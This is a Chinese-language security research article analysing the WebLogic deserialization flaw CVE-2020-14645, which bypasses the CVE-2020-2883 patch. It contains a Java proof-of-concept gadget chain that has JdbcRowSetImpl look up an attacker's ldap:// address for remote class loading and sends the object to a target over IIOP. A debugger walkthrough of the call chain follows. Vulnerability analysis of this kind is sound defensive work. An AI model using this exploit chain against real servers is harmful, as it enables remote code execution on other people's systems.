# Weblogic 远程命令执行漏洞（CVE-2020-14645）分析

阅读量 **377194**

|评论 **1**

发布时间 : 2020-08-07 10:00:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01c72ff8aca9e150e9.jpg)

作者：白帽汇安全研究院[@hu4wufu](https://github.com/hu4wufu "@hu4wufu")

核对：白帽汇安全研究院[@r4v3zn](https://github.com/r4v3zn "@r4v3zn")

## 前言

近期公布的关于 Weblogic 的反序列化RCE漏洞 CVE-2020-14645，是对 CVE-2020-2883的补丁进行绕过。之前的
CVE-2020-2883 本质上是通过 `ReflectionExtractor` 调用任意方法，从而实现调用 `Runtime` 对象的 exec
方法执行任意命令，补丁将 `ReflectionExtractor` 列入黑名单，那么可以使用 `UniversalExtractor`
重新构造一条利用链。`UniversalExtractor` 任意调用 `get`、`is`方法导致可利用 JDNI
远程动态类加载。`UniversalExtractor` 是 Weblogic 12.2.1.4.0 版本中独有的，本文也是基于该版本进行分析。

## 漏洞复现

漏洞利用 POC，以下的分析也是基于该 POC 进行分析

    
    
    ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{new ReflectionExtractor("toString",new Object[]{})});
    PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
    queue.add("1");
    queue.add("1");
    //构造 UniversalExtract 调用 JdbcRowSetImpl 对象的任意方法
    UniversalExtractor universalExtractor = new UniversalExtractor();
    Object object = new Object[]{};
    Reflections.setFieldValue(universalExtractor,"m_aoParam",object);
    Reflections.setFieldValue(universalExtractor,"m_sName","DatabaseMetaData");
    Reflections.setFieldValue(universalExtractor,"m_fMethod",false);
    ValueExtractor[] valueExtractor_list = new ValueExtractor[]{universalExtractor};
    Field[] fields = ChainedExtractor.class.getDeclaredFields();
    Field field = ChainedExtractor.class.getSuperclass().getDeclaredField("m_aExtractor");
    field.setAccessible(true);
    field.set(chainedExtractor,valueExtractor_list);
    JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);
    jdbcRowSet.setDataSourceName("ldap://ip:端口/uaa");
    Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
    queueArray[0] = jdbcRowSet;
    // 发送 IIOP 协议数据包
    Context context = getContext("iiop://ip:port");
    context.rebind("hello", queue);
    

成功弹出计算机

![](https://p2.ssl.qhimg.com/t010d55b49709e3793f.png)

## 漏洞分析

了解过 `JDNI` 注入的都知道漏洞在 `lookup()` 触发，这里在 `JdbcRowSetImpl.class` 中 `326` 行
`lookup()` 函数处设置断点，以下为漏洞利用的简要调用链条：

![](https://p5.ssl.qhimg.com/t019aa936361d0771df.png)

我们从头分析，我们都知道反序列化的根本是对象反序列化的时候，我们从 IO 流里面读出数据的时候再以这种规则把对象还原回来。我们在
`in.readObject()` 处打断点，跟进查看 `PriorityQueue.readObject()` 方法

![](https://p3.ssl.qhimg.com/t01550461884c8ce939.png)

这里 782 执行 `s.defaultReadObject()` ，785 执行 `s.readInt()` 赋给对象输入流大小以及数组长度，并在 790
行执行 for 循环，依次将 `s.readObject()` 方法赋值给 `queue` 对象数组，这里 `queue` 对象数组长度为 2。

![](https://p0.ssl.qhimg.com/t01c280603dd1cd08da.png)

接着往下跟，查看 `heapify()` 方法。`PriorityQueue` 实际上是一个最小堆，这里通过 `siftDown()`
方法进行排序实现堆化，

![](https://p4.ssl.qhimg.com/t01f125b90c981cd3e4.png)

跟进 `siftDown()` 方法，这里首先判断 `comparator` 是否为空

![](https://p5.ssl.qhimg.com/t0176c6abd73f7b3b70.png)

我们可以看看 `comparator` 是怎么来的，由此可见是在 `PriorityQueue` 的构造函数中被赋值的，在初始化构造时，除了给
`this.comparator` 进行赋值之外，通过 `initialCapacity` 进行初始化长度。

![](https://p5.ssl.qhimg.com/t01642f220ad67103d1.png)

`comparator` 不为空，所以我们执行的是 `siftDownUsingComparator()` 方法，所以跟进
`siftDownUsingComparator()` 方法。

![](https://p1.ssl.qhimg.com/t01ae43c3dacfea40c1.png)

继续跟进 `ExtractorComparator.compare()` 方法

![](https://p4.ssl.qhimg.com/t019daeb1d562b8e6bb.png)

这里调用的是 `this.m_extractor.extract()` 方法，来看看 `this.m_extractor`，这里传入了
`extractor`，

![](https://p3.ssl.qhimg.com/t01b8329d232023c94d.png)

`this.m_extractor` 的值是与传入的 `extractor` 有关的。这里需要构造 `this.m_extractor` 为
`ChainedExtractor`，才可以调用 `ChainedExtractor` 的 `extract()` 方法实现 `extract()` 调用。

继续跟进 `ChainedExtractor.extract()` 方法，可以发现会遍历 `aExtractor` 数组，并调用 `extract()`
方法。

![](https://p2.ssl.qhimg.com/t01fcd56379f17fddb3.png)

跟进 `extract()` 方法，此处由于 `m_cacheTarget` 使用了 `transient` 修饰，无法被反序列化，因此只能执行
`else` 部分，最后通过 `this.extractComplex(oTarget)` 进行最终触发漏洞点

![](https://p5.ssl.qhimg.com/t011af3fe22b2c6d221.png)

`this.extractComplex(oTarget)` 中可以看到最后通过 `method.invoke()` 进行反射执行，其中 `oTarget`
和 `aoParam` 都是可控的。

![](https://p3.ssl.qhimg.com/t01f9030055fa2c8935.png)

我们跟进190的 `findMethod()` 方法，在 475 行需要使 `fExactMatch` 为 `true`，`fStatic` 为
`false` 才可让传入 `clz` 的可以获取任意方法。`fStatic` 是可控的，而 `fExactMatch` 默认为`true` ，只要没进入
`for` 循环即可保持 `true` 不变，使 `cParams` 为空即 `aclzParam` 为空的 `Class` 数组即可，此处
`aclzParam` 从 `getClassArray()` 方法获取。

![](https://p3.ssl.qhimg.com/t01de0fad9e1769a5f7.png)

在 `getClasssArray` 中通过获取输入参数的值对应的 Class 进行处理。

![](https://p4.ssl.qhimg.com/t01eb669b04a831acec.png)

由于传入的 `aoParam` 是一个空的 `Object[]`，所以获取对应的 `Class` 也为空的 `Class[]`，跟入
`isPropertyExtractor()` 中进行进行获取可以看到将 `this._fMethod` 获取相反的值。

![](https://p2.ssl.qhimg.com/t0181a8d7231abc8b50.png)

由于 `m_fMethod` 被 `transient` 修饰，不会被序列化，通过分析 `m_fMethod` 赋值过程，可发现在 `init()`
时会获取sCName，并且通过判定是否为 `()` 结尾来进行赋值。

![](https://p1.ssl.qhimg.com/t01c0ee4e5f6f10ce66.png)

![](https://p3.ssl.qhimg.com/t015986a3f1ed80e901.png)

由于参数为 `this` 的原因，导致`getValueExtractorCanonicalName()`方法返回的都是 `null`。

![](https://p5.ssl.qhimg.com/t019ee7094352806c3e.png)

跟入 `getValueExtractorCanonicalName()`函数，最后是通过调用
`computeValuExtractorCanonicalName` 进行处理。

![](https://p2.ssl.qhimg.com/t01d6458eebf2df86b2.png)

跟入 `computeValuExtractorCanonicalName()` 之后，如果 `aoParam`不为 `null` 且数组长度大于 0
就会返回 `null`，由于 `aoParam` 必须为 `null` ，因此我们调用的方法必须是无参的。接着如果方法名 `sName` 不以 `()`
结尾，就会直接返回方法名。否则会判断方法名是否以 `VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES`
数组中的前缀开头，如果是的话就会截取掉并返回。

![](https://p5.ssl.qhimg.com/t0128a35b94e6ede64a.png)

回到 `extractComplex()` 方法中，在 `if` 条件里会对上述返回的方法名做首字母大写处理，然后拼接
`BEAN_ACCESSOR_PREFIXES` 数组中的前缀，判断 `clzTarget` 类中是否含有拼接后的方法。这里可以看到我们只能调用任意类中的
`get` 和 `is` 开头的无参方法。也就解释了为什么 `poc` 会想到利用 `JNDI` 来进行远程动态类加载。

![](https://p0.ssl.qhimg.com/t01ed8dc929024a9a9f.png)

跟进 `method.invoke()` 方法，会直接跳转至 `JdbcRowSetImpl.getDatabaseMetaData()`。

![](https://p2.ssl.qhimg.com/t01072e2c4119b373c3.png)

![](https://p5.ssl.qhimg.com/t01ce0efae8ff5de815.png)

由于`JdbcRowSetImpl.getDatabaseMetaData()`，调用了 `this.connect()`，可以看到在 326 行执行了
`lookup` 操作，触发了漏洞。

![](https://p1.ssl.qhimg.com/t01896b9a52d3d67b74.png)

![](https://p4.ssl.qhimg.com/t013e16ac6a22a46157.png)

至此，跟进 `getDataSourceName()`，可看到调用了可控制的 `dataSource`。

![](https://p3.ssl.qhimg.com/t01a9ba02011556421f.png)

## 总结

此漏洞主要以绕过黑名单的形式，利用 `UniversalExtractor` 任意调用`get`、`is`方法导致 JNDI 注入，由此拓展
CVE-2020-14625。

## 参考

  * [WebLogic coherence UniversalExtractor 反序列化 (CVE-2020-14645) 漏洞分析](https://paper.seebug.org/1280/#cve-2020-14645)
  * <https://www.oracle.com/security-alerts/cpujul2020.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **白帽汇安全研究院** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/213248](/post/id/213248)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [Web安全](/tag/Web安全)
  * [Weblogic](/tag/Weblogic)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01ab2bff67fbbb92a5.png) 白帽汇安全研究院

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

